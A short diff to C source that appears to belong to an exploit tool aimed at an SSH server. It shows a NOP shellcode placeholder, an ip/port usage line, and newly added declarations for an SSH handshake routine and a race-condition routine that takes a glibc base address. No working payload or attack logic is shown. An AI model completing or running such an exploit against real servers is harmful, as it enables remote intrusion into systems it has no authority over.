@@ -20,6 +20,9 @@
 // Shellcode placeholder (replace with actual shellcode)
 unsigned char shellcode[] = "\x90\x90\x90\x90";
 
+int perform_ssh_handshake(int sock);  // Deklarasi fungsi yang hilang
+int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);  // Deklarasi fungsi yang hilang
+
 int main(int argc, char *argv[]) {
     if (argc != 3) {
         fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
